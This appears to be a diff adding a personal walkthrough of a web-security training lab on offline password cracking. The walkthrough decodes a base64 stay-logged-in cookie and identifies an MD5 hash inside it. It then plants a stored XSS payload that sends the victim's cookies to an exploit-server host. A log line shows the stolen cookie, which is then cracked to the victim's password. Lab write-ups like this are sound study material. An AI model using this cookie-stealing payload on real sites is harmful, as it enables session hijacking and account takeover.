@@ -1,0 +1,48 @@
+Lab: Offline password cracking
+
+ This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.
+
+    Your credentials: wiener:peter
+    Victim's username: carlos
+
+We loggin and with staly logged
+
+ookie: session=r30iYfqeMgr1dRQWrg1F69ykFXZWRg4J; stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
+
+
+echo "d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw" | base64 -d
+
+wiener:51dc30ddc473d43a6011e9ebba6ca770 okay we have an early base64
+
+51dc30ddc473d43a6011e9ebba6ca770
+echo -n "peter" | md5sum                              
+
+
+51dc30ddc473d43a6011e9ebba6ca770  -
+
+crackstation.net
+hashcat
+
+and we know also the password is with md5
+
+
+then it says its a vulnerability in the comments section
+lets try
+
+<script> alert(1) </script>  works
+
+lets try 
+
+<script>document.location="https://exploit-0aa100de04696e85804d893101ef00d7.exploit-server.net/exploit"+document.cookie</script>
+
+1
+
+go to logs in the explotation
+
+10.0.4.110      2025-09-07 09:40:04 +0000 "GET /exploitsecret=N5y6RFRX3OjdzgNJlWTPIgUDdid5CLRA;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+
+lets decode  Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+
+carlos:26323c16d5f4dabff3bb136f2460a943
+
+26323c16d5f4dabff3bb136f2460a943	md5	onceuponatime
